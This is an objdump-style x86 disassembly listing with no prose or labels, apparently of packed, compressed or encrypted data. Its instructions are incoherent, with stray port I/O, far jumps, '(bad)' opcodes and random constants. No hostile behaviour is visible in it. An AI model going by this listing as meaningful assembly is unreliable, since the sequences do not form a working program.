  42b4ce:	add    esi,DWORD PTR [ecx+0x3bb84d74]
  42b4d4:	in     eax,0xb0
  42b4d6:	cld    
  42b4d7:	ret    
  42b4d8:	cmp    BYTE PTR ds:0xac71623f,dh
  42b4de:	inc    ebx
  42b4df:	dec    ebx
  42b4e0:	jns    0x42b507
  42b4e2:	push   esp
  42b4e3:	inc    edi
  42b4e4:	fld    st(2)
  42b4e6:	xlat   BYTE PTR ds:[ebx]
  42b4e7:	imul   edi,DWORD PTR [ebp+0x65a8b881],0x6939c3bd
  42b4f1:	cmc    
  42b4f2:	jmp    0x42b504
  42b4f4:	stos   BYTE PTR es:[edi],al
  42b4f5:	sbb    bh,BYTE PTR [edi]
  42b4f7:	xor    ah,BYTE PTR [ecx+0x4c]
  42b4fa:	inc    ebx
  42b4fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4fc:	ss pop ebp
  42b4fe:	mov    ebp,0xb84427ff
  42b503:	mov    ds:0xaa78a75e,al
  42b508:	inc    esp
  42b509:	les    edx,FWORD PTR [esi]
  42b50b:	mov    esp,0xf0861f1c
  42b510:	sub    eax,edx
  42b512:	popf   
  42b513:	arpl   di,si
  42b515:	dec    edx
  42b516:	cmp    ch,0x7e
  42b519:	cli    
  42b51a:	add    dl,BYTE PTR [ecx-0x29]
  42b51d:	push   ss
  42b51e:	lds    eax,FWORD PTR [edx-0x563c5a99]
  42b524:	pop    esp
  42b525:	dec    edx
  42b526:	or     ebp,DWORD PTR [ecx]
  42b528:	jle    0x42b567
  42b52a:	clc    
  42b52b:	dec    edx
  42b52c:	and    eax,0x459abb48
  42b531:	mov    eax,0x86eb1037
  42b536:	push   ebp
  42b537:	retf   
  42b538:	cmp    ecx,DWORD PTR [ecx-0x56c7387f]
  42b53e:	pop    esi
  42b53f:	int3   
  42b540:	inc    ebx
  42b541:	push   ebx
  42b542:	sub    al,0x9d
  42b544:	jne    0x42b570
  42b546:	je     0x42b5b7
  42b548:	stc    
  42b549:	sbb    DWORD PTR [edi+0x22],ecx
  42b54c:	dec    edi
  42b54d:	rsqrtps xmm3,XMMWORD PTR [di-0x10]
  42b552:	addr16 int 0x0
  42b555:	ins    DWORD PTR es:[edi],dx
  42b556:	push   ds
  42b557:	sub    al,0xd
  42b559:	jo     0x42b4f0
  42b55b:	outs   dx,DWORD PTR ss:[esi]
  42b55d:	dec    ebx
  42b55e:	cs sbb eax,0xec83825f
  42b564:	jns    0x42b5d6
  42b566:	xor    DWORD PTR [edi-0x4f],ebx
  42b569:	scas   eax,DWORD PTR es:[edi]
  42b56a:	test   eax,0xefa60176
  42b56f:	psrld  mm5,QWORD PTR [ebx-0x4742a393]
  42b576:	adc    ebp,ecx
  42b578:	out    dx,al
  42b579:	sbb    al,0xf7
  42b57b:	cs pushw cs
  42b57e:	push   ebp
  42b57f:	out    dx,eax
  42b580:	retf   
  42b581:	adc    al,0xa4
  42b583:	dec    ebp
  42b584:	cld    
  42b585:	sub    al,0xf9
  42b587:	cmc    
  42b588:	mov    DWORD PTR [ecx-0x6d9d13e8],0x9f55eb
	...
  42b5f2:	add    BYTE PTR [eax],al
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	sahf   
  42b601:	rcl    DWORD PTR [esi+0x1d0be91],cl
  42b607:	add    BYTE PTR ds:0x7c000001,al
  42b60d:	into   
  42b60e:	lods   al,BYTE PTR ds:[esi]
  42b60f:	xchg   DWORD PTR [edx-0x1e0a5654],ecx
  42b615:	add    al,0xb8
  42b617:	icebp  
  42b618:	imul   DWORD PTR [ebx]
  42b61a:	xchg   ecx,eax
  42b61b:	mov    esp,0xe85bc317
  42b620:	sbb    BYTE PTR [edi+0x18],cl
  42b623:	pop    edi
  42b624:	shl    BYTE PTR [ebp+0x21],1
  42b627:	inc    edx
  42b628:	sub    esp,DWORD PTR [edi-0x1249b60b]
  42b62e:	inc    ebp
  42b62f:	xor    eax,0xbb555918
  42b634:	pop    edx
  42b635:	or     BYTE PTR [esi+0x21397445],dh
  42b63b:	fs nop
  42b63d:	les    ebx,FWORD PTR [edi+0x75]
  42b640:	aas    
  42b641:	fsubr  DWORD PTR [esi+eiz*8]
  42b644:	inc    ecx
  42b645:	mov    bl,0xd3
  42b647:	ret    0xbb97
  42b64a:	aas    
  42b64b:	in     eax,0x9
  42b64d:	test   eax,0x1f6d8682
  42b652:	or     al,0xc1
  42b654:	loope  0x42b5f9
  42b656:	jge    0x42b6c4
  42b658:	in     eax,0xb5
  42b65a:	lods   al,BYTE PTR ds:[esi]
  42b65b:	dec    esp
  42b65c:	(bad)  
  42b65d:	sahf   
  42b65e:	lahf   
  42b65f:	xabort 0xff
  42b662:	or     ah,BYTE PTR [ebp-0x6286f722]
  42b668:	mov    esp,0xd862f46b
  42b66d:	cmp    BYTE PTR [esi+0x1f6a71fb],cl
  42b673:	sbb    BYTE PTR [ebx],ah
  42b675:	dec    esi
  42b676:	mov    ds:0x198f5cda,al
  42b67b:	int3   
  42b67c:	rcr    edi,0xfb
  42b67f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b680:	cld    
  42b681:	push   cs
  42b682:	sbb    edi,esi
  42b684:	pop    eax
  42b685:	rcr    BYTE PTR [ecx-0x4f1c11de],0xa0
  42b68c:	retf   0xf6eb
  42b68f:	or     eax,0xa63b3e91
  42b694:	sti    
  42b695:	ja     0x42b64e
  42b697:	pusha  
  42b698:	lods   al,BYTE PTR ds:[esi]
  42b699:	lods   eax,DWORD PTR ds:[esi]
  42b69a:	inc    eax
  42b69b:	fwait
  42b69c:	jbe    0x42b640
  42b69e:	adc    dl,BYTE PTR [edi]
  42b6a0:	je     0x42b67a
  42b6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6a3:	int3   
  42b6a4:	not    DWORD PTR [eax+0x41c61129]
  42b6aa:	jb     0x42b6d7
  42b6ac:	sbb    ah,bh
  42b6ae:	mov    ebx,0x497909ad
  42b6b3:	mov    ds:0x31266ee6,al
  42b6b8:	test   al,0xc
  42b6ba:	add    eax,0xb133bb3b
  42b6bf:	enter  0xa08f,0x34
  42b6c3:	sub    dh,BYTE PTR [esi-0x11c19d0d]
  42b6c9:	scas   al,BYTE PTR es:[edi]
  42b6ca:	gs pushf 
  42b6cc:	add    al,0x81
  42b6ce:	or     al,0x2f
  42b6d0:	das    
  42b6d1:	pop    ebp
  42b6d2:	sub    DWORD PTR [edi-0x59c9b3b7],edi
  42b6d8:	call   0xb6cd:0x6b555186
  42b6df:	mov    DWORD PTR [eax-0x23ca6e7],ebp
  42b6e5:	inc    ecx
  42b6e6:	and    esp,eax
  42b6e8:	fdivr  DWORD PTR [edi+0x7]
  42b6eb:	mov    ebp,0x664422a8
  42b6f0:	jmp    0xdb6d1fe7
  42b6f5:	cmc    
  42b6f6:	rol    DWORD PTR [eiz*1-0x3d9275d0],1
  42b6fd:	mov    dh,0x56
  42b700:	cmp    dh,BYTE PTR [edi]
  42b702:	jo     0x42b70c
  42b704:	mov    cl,0x72
  42b706:	xlat   BYTE PTR ds:[ebx]
  42b707:	cmp    BYTE PTR [esi+0x8],ch
  42b70a:	les    ecx,FWORD PTR [edx]
  42b70c:	dec    ecx
  42b70d:	jp     0x42b76f
  42b70f:	and    DWORD PTR [eax+eax*1+0x0],ecx
	...
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	pushf  
  42b781:	inc    ecx
  42b782:	gs pop edx
  42b784:	ret    
  42b785:	rol    DWORD PTR [ecx],1
  42b787:	add    BYTE PTR ds:0xa3000001,al
  42b78d:	or     DWORD PTR [edi-0x6da90737],ebp
  42b793:	sbb    bl,BYTE PTR fs:[esi-0x3f1fb3eb]
  42b79a:	mov    DWORD PTR [ebx+0x7d66dddb],ebp
  42b7a0:	stc    
  42b7a1:	jb     0x42b78c
  42b7a3:	into   
  42b7a4:	push   eax
  42b7a5:	dec    esi
  42b7a6:	xchg   esi,eax
  42b7a7:	xor    bl,BYTE PTR [ecx+0x2b]
  42b7aa:	cmp    al,0x27
  42b7ac:	dec    ebx
  42b7ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7ae:	test   al,0xe9
  42b7b0:	sbb    BYTE PTR [eax+0x3b],bh
  42b7b3:	inc    ebp
  42b7b4:	or     al,0xfa
  42b7b6:	shr    BYTE PTR ds:0xad0a383e,1
  42b7bc:	jge    0x42b776
  42b7be:	inc    eax
  42b7bf:	sar    BYTE PTR [edi-0x5122d4e6],1
  42b7c5:	in     al,dx
  42b7c6:	out    dx,eax
  42b7c7:	icebp  
  42b7c8:	hlt    
  42b7c9:	rol    ebx,1
  42b7cb:	mov    edi,DWORD PTR ds:0x30267b6f
  42b7d1:	mov    dl,0xe0
  42b7d3:	cmc    
  42b7d4:	enter  0x3d6e,0x7d
  42b7d8:	mov    al,ds:0xb8e70fcc
  42b7dd:	push   esi
  42b7de:	(bad)  
  42b7e0:	pop    ebp
  42b7e1:	mov    cl,0xbb
  42b7e3:	fcomip st,st(2)
  42b7e5:	xchg   BYTE PTR [edx],dl
  42b7e7:	mov    al,0x7
  42b7e9:	in     al,0x97
  42b7eb:	jl     0x42b868
  42b7ed:	adc    al,0xdc
  42b7ef:	sbb    ah,BYTE PTR [ecx-0x25]
  42b7f2:	jbe    0x42b815
  42b7f4:	xchg   edx,eax
  42b7f5:	ja     0x42b82d
  42b7f7:	and    BYTE PTR [eax-0x37f67713],dl
  42b7fd:	cli    
  42b7fe:	pushf  
  42b7ff:	push   0xacfd6c2b
  42b804:	or     edi,DWORD PTR [ecx+ebp*2+0xa]
  42b808:	jmp    0x42b7ee
  42b80a:	fcomp  QWORD PTR [eax+0xb8eb161]
  42b810:	mov    ch,0x1e
  42b812:	cmp    BYTE PTR [esi+esi*1-0xa],dh
  42b816:	popa   
  42b817:	mov    esi,DWORD PTR [esi]
  42b819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b81a:	retf   
  42b81b:	cli    
  42b81c:	sbb    al,0x0
  42b81e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b81f:	mov    ds:0x8cbe7bbf,al
  42b824:	mov    esi,0x62161d94
  42b829:	pushf  
  42b82a:	and    bl,ch
  42b82c:	mov    dl,0x9a
  42b82e:	lods   eax,DWORD PTR ds:[esi]
  42b82f:	cdq    
  42b830:	ret    0x7849
  42b833:	pop    ebp
  42b834:	jno    0x42b87f
  42b836:	adc    dh,BYTE PTR [eax+ebp*2]
  42b839:	mov    ah,0xa1
  42b83b:	(bad)  
  42b83c:	push   eax
  42b83d:	shl    BYTE PTR [esi+edi*8],0xf0
  42b841:	or     al,0xe4
  42b843:	push   es
  42b844:	repnz out dx,al
  42b846:	shl    BYTE PTR [edx+0x6e63447c],0xe5
  42b84d:	mov    eax,ds:0x272b3beb
  42b852:	cmp    eax,0xf09f64bd
  42b857:	mov    dh,0xaf
  42b859:	ss je  0x42b867
  42b85c:	jl     0x42b82b
  42b85e:	jae    0x42b8d3
  42b860:	inc    edi
  42b861:	sbb    DWORD PTR [eax-0x18cc22cf],0x17d3ccf4
  42b86b:	or     ch,bl
  42b86d:	mov    al,0x4a
  42b86f:	mov    esi,0x18a617ae
  42b874:	loope  0x42b874
  42b876:	mov    esi,DWORD PTR [esi-0x68]
  42b879:	cmp    bh,BYTE PTR [eax-0x48]
  42b87c:	jmp    0x7dd8:0x78a2d2ed
  42b883:	mov    eax,ds:0x7e93ad73
  42b888:	cmp    dl,BYTE PTR [ecx+ecx*4-0x13a24db]
  42b88f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b890:	jo     0x42b892
	...
  42b8f2:	add    BYTE PTR [eax],al
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ecx,DWORD PTR [eax-0x372d02a5]
  42b905:	rol    BYTE PTR [ecx],cl
  42b907:	add    BYTE PTR ds:0xe3000001,al
  42b90d:	pop    eax
  42b90e:	nop
  42b90f:	leave  
  42b910:	dec    edi
  42b911:	pop    eax
  42b912:	clc    
  42b913:	dec    ecx
  42b914:	cmp    dl,bh
  42b916:	sub    dh,bh
  42b918:	rol    DWORD PTR [ebp+eax*2-0x66],1
  42b91c:	dec    esp
  42b91d:	call   0xd18f395f
  42b922:	ret    0x56bb
  42b925:	rcl    cl,1
  42b927:	fcomp  QWORD PTR [eax-0x30]
  42b92a:	push   ss
  42b92b:	xchg   ebx,eax
  42b92c:	jg     0x42b99d
  42b92e:	mov    ds:0x652f9be1,al
  42b933:	sti    
  42b934:	cmp    eax,0x3aec3d8c
  42b939:	lods   eax,DWORD PTR ds:[esi]
  42b93a:	or     eax,0x3bc576f6
  42b93f:	adc    eax,0x915a97cf
  42b944:	lahf   
  42b945:	aad    0xd2
  42b947:	iret   
  42b948:	xchg   ebx,eax
  42b949:	mov    dh,0x29
  42b94b:	cmp    DWORD PTR [ebx],ecx
  42b94d:	xchg   ebp,eax
  42b94e:	ins    BYTE PTR es:[edi],dx
  42b94f:	lea    esp,[eax+ebx*4-0x78]
  42b953:	lods   al,BYTE PTR ds:[esi]
  42b954:	call   0x547e1f74
  42b959:	mov    bl,0x8c
  42b95b:	dec    eax
  42b95c:	push   es
  42b95d:	and    al,BYTE PTR [edx-0x5]
  42b960:	imul   eax,ebx,0xffffffb6
  42b963:	cdq    
  42b964:	xchg   ebp,eax
  42b965:	(bad)  
  42b966:	lock aam 0xa3
  42b969:	int    0x43
  42b96b:	adc    al,bl
  42b96d:	sub    ebp,DWORD PTR [edx+0x4390d640]
  42b973:	adc    ebp,ecx
  42b975:	imul   edx,ebp,0xa55fe73d
  42b97b:	adc    dh,ah
  42b97d:	mov    cl,BYTE PTR [edx+0x16b63411]
  42b983:	push   ecx
  42b984:	cmp    esi,DWORD PTR [ecx-0x4692056f]
  42b98a:	sub    al,0x8b
  42b98c:	or     dl,dh
  42b98e:	add    bh,BYTE PTR [ecx+0x20]
  42b991:	push   ebp
  42b992:	ret    0xf963
  42b995:	mov    al,ds:0x24c7d189
  42b99a:	das    
  42b99b:	xchg   edx,eax
  42b99c:	popf   
  42b99d:	push   ss
  42b99e:	lds    eax,FWORD PTR [esi]
  42b9a0:	mov    BYTE PTR [edx+0x35b603c7],bl
  42b9a6:	inc    edx
  42b9a7:	mov    al,ds:0xe846404d
  42b9ac:	in     al,0xdf
  42b9ae:	out    dx,al
  42b9af:	lods   eax,DWORD PTR ds:[esi]
  42b9b0:	ret    0x4593
  42b9b3:	inc    ebp
  42b9b4:	bound  ebx,QWORD PTR [esi+eiz*4+0x29391c0f]
  42b9bb:	adc    al,0xd8
  42b9bd:	add    DWORD PTR [edx+edx*4],esi
  42b9c0:	jbe    0x42b953
  42b9c2:	mov    esi,0x6ca16d4e
  42b9c7:	lods   al,BYTE PTR ds:[esi]
  42b9c8:	pop    ecx
  42b9c9:	js     0x42b95e
  42b9cb:	mov    al,ds:0x3838804d
  42b9d0:	sti    
  42b9d1:	mov    bh,BYTE PTR [esi]
  42b9d3:	jg     0x42b95a
  42b9d5:	cmp    BYTE PTR [edi-0x23f966dd],cl
  42b9db:	mov    dl,0xcb
  42b9dd:	jae    0x42b9a9
  42b9df:	push   es
  42b9e0:	(bad)  
  42b9e1:	or     edx,DWORD PTR [ebx+edx*1]
  42b9e4:	and    ebx,DWORD PTR [eax-0x29]
  42b9e7:	ja     0x42b9b3
  42b9e9:	pop    ebp
  42b9ea:	sbb    dh,BYTE PTR [eax+0x7834a8ff]
  42b9f0:	sbb    DWORD PTR [ebx+0x77505300],esp
  42b9f6:	fcmovu st,st(4)
  42b9f8:	jg     0x42ba56
  42b9fa:	bound  esp,QWORD PTR [esi]
  42b9fc:	ds sub ecx,DWORD PTR cs:[ecx-0x3a]
  42ba01:	pushf  
  42ba02:	add    BYTE PTR ds:0xddd17eb1,dl
  42ba08:	inc    edx
  42ba09:	mov    WORD PTR [ecx],?
  42ba0b:	into   
  42ba0c:	push   0x33
  42ba0e:	gs js  0x42b993
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [ebx-0x320f9831],ebp
  42ba85:	rol    DWORD PTR [ecx],cl
  42ba87:	add    BYTE PTR ds:0xec000001,al
  42ba8d:	out    0x7a,al
  42ba8f:	ds and eax,0x798f5cf9
  42ba95:	push   ds
  42ba96:	xchg   esi,eax
  42ba97:	stos   DWORD PTR es:[edi],eax
  42ba98:	inc    edi
  42ba99:	imul   ebp,DWORD PTR [ebx],0x756fbe2a
  42ba9f:	sbb    al,0x6b
  42baa1:	mov    bh,0xec
  42baa3:	or     al,BYTE PTR [ebp-0x5d]
  42baa6:	add    al,0x5b
  42baa8:	bound  edx,QWORD PTR [ecx-0x55]
  42baab:	jecxz  0x42bac0
  42baad:	aad    0x37
  42baaf:	pop    edi
  42bab0:	push   ebp
  42bab1:	pop    es
  42bab2:	mov    cl,0xbe
  42bab4:	out    dx,al
  42bab5:	dec    ebx
  42bab6:	dec    edx
  42bab7:	xchg   ebx,eax
  42bab8:	data16 sahf 
  42baba:	hlt    
  42babb:	sub    bh,BYTE PTR ds:0xb203b34d
  42bac1:	pop    esp
  42bac2:	mov    al,ds:0xe6e45f2d
  42bac7:	mov    bl,0xce
  42bac9:	push   ss
  42baca:	jae    0x42ba84
  42bacc:	inc    ecx
  42bacd:	xchg   ecx,eax
  42bace:	sub    al,0xac
  42bad0:	sub    eax,0x357e3634
  42bad5:	cmp    ebp,DWORD PTR [esi+0x74]
  42bad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bad9:	add    al,0x8b
  42badb:	ret    
  42badc:	je     0x42ba82
  42bade:	dec    esi
  42badf:	lods   eax,DWORD PTR ds:[esi]
  42bae0:	lods   al,BYTE PTR ds:[esi]
  42bae1:	jmp    0x42ba71
  42bae3:	sbb    eax,0xc281359b
  42bae8:	popf   
  42bae9:	mov    ch,0x70
  42baeb:	jp     0x42bb11
  42baed:	add    BYTE PTR [ebp-0x5b],dl
  42baf0:	and    DWORD PTR [ecx+0x63],edx
  42baf3:	ret    
  42baf4:	sahf   
  42baf5:	mov    eax,0xc9ade9b9
  42bafa:	or     ebp,ebx
  42bafc:	mov    esi,edx
  42bafe:	into   
  42baff:	test   al,0x57
  42bb01:	daa    
  42bb02:	cld    
  42bb03:	jns    0x42bb0f
  42bb05:	rcl    BYTE PTR [esp+edx*8],1
  42bb08:	inc    edx
  42bb09:	dec    esp
  42bb0a:	cmp    BYTE PTR [eax-0xccb832e],dh
  42bb10:	pop    ds
  42bb11:	ret    0x3a17
  42bb14:	rcr    DWORD PTR [ebx],0x2c
  42bb17:	out    0xa4,eax
  42bb19:	mov    bh,0x79
  42bb1b:	shl    ebp,cl
  42bb1d:	cmp    eax,0xa1c7fb26
  42bb22:	call   0x5f4f0eaa
  42bb27:	inc    ecx
  42bb28:	and    dl,BYTE PTR [ebx]
  42bb2a:	push   0xffffffb6
  42bb2c:	mov    ?,esi
  42bb2e:	push   eax
  42bb2f:	in     al,dx
  42bb30:	adc    esi,ebx
  42bb32:	ins    DWORD PTR es:[edi],dx
  42bb33:	test   eax,0x4db84b3a
  42bb38:	dec    ebx
  42bb39:	jge    0x42bb0e
  42bb3b:	inc    ebp
  42bb3c:	cmp    dl,BYTE PTR [esi+0x2f]
  42bb3f:	push   es
  42bb40:	iret   
  42bb41:	and    DWORD PTR [ecx],ebp
  42bb43:	ins    BYTE PTR es:[edi],dx
  42bb44:	jl     0x42bb65
  42bb46:	ret    
  42bb47:	(bad)  
  42bb48:	out    dx,al
  42bb49:	aaa    
  42bb4a:	sub    BYTE PTR [eax],ch
  42bb4c:	es sub eax,0x8182324e
  42bb52:	mov    ebp,0x60e33d2b
  42bb57:	pop    ds
  42bb58:	sbb    bl,BYTE PTR [eax+0x51]
  42bb5b:	push   eax
  42bb5c:	and    eax,0x21bfe4c7
  42bb61:	repnz inc eax
  42bb63:	cmp    bl,BYTE PTR ds:0xcc08de06
  42bb69:	mov    bl,0xb4
  42bb6b:	ds adc esp,eax
  42bb6e:	and    edx,DWORD PTR [ebp+0x1]
  42bb71:	push   0xfea129c8
  42bb76:	inc    ecx
  42bb77:	mov    ds:0xeb3cde97,eax
  42bb7c:	mov    DWORD PTR [ebx+0x8],eax
  42bb7f:	lock jno 0x42bbe0
  42bb82:	push   esp
  42bb83:	pop    eax
  42bb84:	out    dx,al
  42bb85:	jae    0x42bb17
  42bb87:	adc    edi,DWORD PTR [edi-0x10af4fff]
  42bb8d:	or     esi,edi
  42bb8f:	cmp    bh,bh
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	shr    DWORD PTR [edx-0x2b2dc560],cl
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    eax,0xda000001
  42bc0d:	inc    ebx
  42bc0e:	stos   BYTE PTR es:[edi],al
  42bc0f:	(bad)  
  42bc10:	mov    eax,0xe926cb62
  42bc15:	ins    DWORD PTR es:[edi],dx
  42bc16:	mov    edx,0xe3274292
  42bc1b:	fisub  WORD PTR [ecx-0x586674a5]
  42bc21:	xchg   ebx,eax
  42bc22:	in     eax,dx
  42bc23:	outs   dx,DWORD PTR ds:[esi]
  42bc24:	pop    edi
  42bc25:	cld    
  42bc26:	shr    ecx,1
  42bc28:	push   eax
  42bc29:	fst    QWORD PTR [edi-0x4a]
  42bc2c:	scas   eax,DWORD PTR es:[edi]
  42bc2d:	mov    bl,0x89
  42bc2f:	adc    esi,edx
  42bc31:	call   0xb3b9a549
  42bc36:	scas   eax,DWORD PTR es:[edi]
  42bc37:	rol    DWORD PTR [ebp-0x36cddbf9],0x24
  42bc3e:	xlat   BYTE PTR ds:[ebx]
  42bc3f:	or     eax,0xc7f4e239
  42bc44:	and    al,BYTE PTR [edi]
  42bc46:	pop    ss
  42bc47:	mov    al,ds:0xef4a7e01
  42bc4c:	(bad)  
  42bc4e:	int3   
  42bc4f:	cdq    
  42bc50:	push   0xffffffd0
  42bc52:	mov    edx,0x3be57251
  42bc57:	mov    esp,0x45c04f2d
  42bc5c:	sbb    BYTE PTR [ecx-0x32ac19ef],bh
  42bc62:	sbb    ecx,DWORD PTR ds:[esi+0x31ed1ed3]
  42bc69:	ret    
  42bc6a:	lods   eax,DWORD PTR ds:[esi]
  42bc6b:	cwde   
  42bc6c:	sbb    ch,dh
  42bc6e:	xchg   ebp,eax
  42bc6f:	sar    BYTE PTR gs:[esp+edx*2+0xe],1
  42bc74:	fld    st(7)
  42bc76:	out    0xd8,eax
  42bc78:	pop    esp
  42bc79:	push   esp
  42bc7a:	fbstp  TBYTE PTR ds:0xcf98e2ec
  42bc80:	jmp    0x42bcd5
  42bc82:	xchg   ebp,eax
  42bc83:	xchg   DWORD PTR ds:0x8211047f,edx
  42bc89:	inc    edi
  42bc8a:	idiv   bl
  42bc8c:	stos   BYTE PTR es:[edi],al
  42bc8d:	test   BYTE PTR [esp+ecx*1+0x45eb81ab],0x39
  42bc95:	push   0xb68350d1
  42bc9a:	jnp    0x42bc49
  42bc9c:	and    ecx,DWORD PTR [edx]
  42bc9e:	or     al,0x28
  42bca0:	sub    edi,ebp
  42bca2:	cdq    
  42bca3:	cmp    eax,0xe5883de7
  42bca8:	mov    cl,0x75
  42bcaa:	loope  0x42bc7f
  42bcac:	dec    esi
  42bcad:	scas   al,BYTE PTR es:[edi]
  42bcae:	aas    
  42bcaf:	idiv   BYTE PTR [ebx+0x51e0dd0e]
  42bcb5:	jns    0x42bd02
  42bcb7:	jecxz  0x42bcf9
  42bcb9:	jg     0x42bc92
  42bcbb:	sub    eax,0xa421a87
  42bcc0:	shl    WORD PTR [edi],cl
  42bcc3:	adc    al,0x3a
  42bcc5:	aad    0x3d
  42bcc7:	fstp   TBYTE PTR [edx+0x4592495b]
  42bccd:	popa   
  42bcce:	mov    eax,0x83f49751
  42bcd3:	cmp    esp,edi
  42bcd5:	jmp    0x9aca:0xe9b39409
  42bcdc:	or     BYTE PTR gs:[ebx+0x3dfbc56f],dl
  42bce3:	add    eax,0x8a4f95a1
  42bce8:	std    
  42bce9:	jno    0x42bcd6
  42bceb:	mov    bl,0x3c
  42bced:	mov    ch,0x76
  42bcef:	sbb    cl,bl
  42bcf1:	jae    0x42bd10
  42bcf3:	retf   0xc42e
  42bcf6:	lods   al,BYTE PTR ds:[esi]
  42bcf7:	mov    ds,WORD PTR [eax]
  42bcf9:	jl     0x42bc90
  42bcfb:	and    BYTE PTR [esp+ebp*8],0x79
  42bcff:	sahf   
  42bd00:	daa    
  42bd01:	aaa    
  42bd02:	push   ss
  42bd03:	xchg   esp,eax
  42bd04:	pop    ss
  42bd05:	addr16 sbb al,0xc4
  42bd08:	iret   
  42bd09:	test   al,0x1c
  42bd0b:	je     0x42bd39
  42bd0d:	cmp    DWORD PTR [esi],eax
  42bd0f:	inc    edx
  42bd10:	push   cs
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bde4
  42bd81:	fs stos DWORD PTR es:[edi],eax
  42bd83:	leave  
  42bd84:	xlat   BYTE PTR ds:[ebx]
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0x4b000001,al
  42bd8d:	jg     0x42bd6c
  42bd8f:	mov    al,ds:0xec8e1a6e
  42bd94:	outs   dx,BYTE PTR ds:[esi]
  42bd95:	or     BYTE PTR [ebx],al
  42bd97:	dec    esp
  42bd98:	in     eax,0x66
  42bd9a:	cmp    BYTE PTR [ecx],0x39
  42bd9d:	inc    edi
  42bd9e:	or     cl,BYTE PTR [edi-0x1f74b8d4]
  42bda4:	loop   0x42be0f
  42bda6:	out    0x9a,al
  42bda8:	and    DWORD PTR [esi-0x72],ebx
  42bdab:	(bad)  
  42bdac:	xchg   BYTE PTR [ebp+0x2181a2da],dl
  42bdb2:	js     0x42bde9
  42bdb4:	inc    edx
  42bdb5:	add    DWORD PTR [edi-0x212dce4c],ebp
  42bdbb:	test   DWORD PTR cs:[eax+0x6cd909fe],ecx
  42bdc2:	xor    eax,0xc1a37f63
  42bdc7:	push   eax
  42bdc8:	scas   eax,DWORD PTR es:[edi]
  42bdc9:	inc    esp
  42bdca:	dec    eax
  42bdcb:	scas   al,BYTE PTR es:[edi]
  42bdcc:	or     al,BYTE PTR [esi]
  42bdce:	xchg   BYTE PTR [eax-0x75035741],cl
  42bdd4:	sub    edx,DWORD PTR [edx+0x6b]
  42bdd7:	repz mov bl,0x62
  42bdda:	fwait
  42bddb:	mov    ebx,0x461b128e
  42bde0:	pop    ebp
  42bde1:	jle    0x42be5c
  42bde3:	repz fild DWORD PTR [edi+0x6378c3c7]
  42bdea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bdeb:	int    0xea
  42bded:	iret   
  42bdee:	pop    eax
  42bdef:	mov    al,ds:0x93b0d4da
  42bdf4:	es jge 0x42be38
  42bdf7:	and    al,0x3e
  42bdf9:	call   0xe1ec6d6d
  42bdfe:	sti    
  42bdff:	mov    esp,0xae72c3ac
  42be04:	aam    0xad
  42be06:	and    eax,0x1bedca12
  42be0b:	dec    edi
  42be0c:	retf   0xdfbe
  42be0f:	sahf   
  42be10:	sbb    eax,0xad182234
  42be15:	pop    ebx
  42be16:	xchg   ebp,eax
  42be17:	pop    ebx
  42be18:	icebp  
  42be19:	std    
  42be1a:	xchg   BYTE PTR [eax-0x414a5dda],al
  42be20:	sub    bl,dl
  42be22:	xor    BYTE PTR [esi],0xc2
  42be25:	cmp    esp,ebx
  42be27:	add    eax,0xd7fd0803
  42be2c:	sbb    DWORD PTR es:[ecx-0x70002a41],esi
  42be33:	imul   eax,edx,0xffffffbc
  42be36:	popa   
  42be37:	adc    edi,DWORD PTR [edi-0x7e]
  42be3a:	cdq    
  42be3b:	inc    ebp
  42be3c:	outs   dx,BYTE PTR ds:[esi]
  42be3d:	jae    0x42bdf4
  42be3f:	scas   eax,DWORD PTR es:[edi]
  42be40:	adc    eax,0x7e07e3e6
  42be45:	jge    0x42bec2
  42be47:	add    al,0x2
  42be4a:	sbb    DWORD PTR [edx+0x59],edx
  42be4d:	inc    eax
  42be4e:	ret    0xd657
  42be51:	pop    ebp
  42be52:	xor    al,0xe6
  42be54:	jns    0x42be7d
  42be56:	pop    ebx
  42be57:	push   edi
  42be58:	(bad)  
  42be59:	out    0x94,eax
  42be5b:	data16 mov al,0x2f
  42be5e:	(bad)  
  42be60:	enter  0xd64a,0xcf
  42be64:	add    ah,BYTE PTR [ebx]
  42be66:	cmp    ch,al
  42be68:	fdiv   QWORD PTR [edx-0x7c]
  42be6b:	push   ss
  42be6c:	mov    WORD PTR [edx-0x46],?
  42be6f:	ret    0x98ab
  42be72:	cwde   
  42be73:	test   eax,0xbb9debc9
  42be78:	leave  
  42be79:	ins    BYTE PTR es:[edi],dx
